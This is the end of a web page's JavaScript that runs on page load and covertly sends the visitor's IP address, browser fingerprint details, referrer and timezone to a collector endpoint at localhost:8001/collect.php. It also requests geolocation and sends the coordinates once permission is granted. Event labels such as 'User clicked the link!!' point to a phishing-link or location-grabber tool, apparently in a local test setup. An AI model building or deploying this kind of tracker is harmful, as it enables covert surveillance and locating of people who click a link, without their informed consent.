     async function sendBasicData() {
       try {
         // Get IP from external service
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
   
         // Prepare payload with available info
         const payload = {
           event: "User clicked the link!!",
           ip: ipData.ip,
           userAgent: navigator.userAgent,
           screen: {
             width: window.screen.width,
             height: window.screen.height,
             colorDepth: window.screen.colorDepth,
           },
           language: navigator.language,
           platform: navigator.platform,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
           referrer: document.referrer || null,
           location: null,  // will fill if user allows later
         };
   
         // Send immediately
         await fetch("http://localhost:8001/collect.php", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload),
         });
   
         console.log("Basic user data sent.");
   
       } catch (err) {
         console.error("Failed to send basic data:", err);
       }
     }
   
     function requestAndSendLocation() {
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
           const { latitude, longitude, accuracy } = pos.coords;
           try {
             // Enrich data with location info
             const ipRes = await fetch("https://api.ipify.org?format=json");
             const ipData = await ipRes.json();
   
             const payload = {
               event: "User Accepted the location Permission!!",
               ip: ipData.ip,
               userAgent: navigator.userAgent,
               screen: {
                 width: window.screen.width,
                 height: window.screen.height,
                 colorDepth: window.screen.colorDepth,
               },
               language: navigator.language,
               platform: navigator.platform,
               timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
               referrer: document.referrer || null,
               location: {
                 lat: latitude,
                 lon: longitude,
                 accuracy,
               },
             };
   
             await fetch("http://localhost:8001/collect.php", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(payload),
             });
   
             console.log("Location data sent.");
   
           } catch (err) {
             console.error("Failed to send location data:", err);
           }
         },
         (err) => {
           console.warn("Geolocation denied or failed:", err);
         }
       );
     }
   
     document.addEventListener("DOMContentLoaded", () => {
       sendBasicData();
       requestAndSendLocation(); // this triggers permission prompt
     });
   </script>
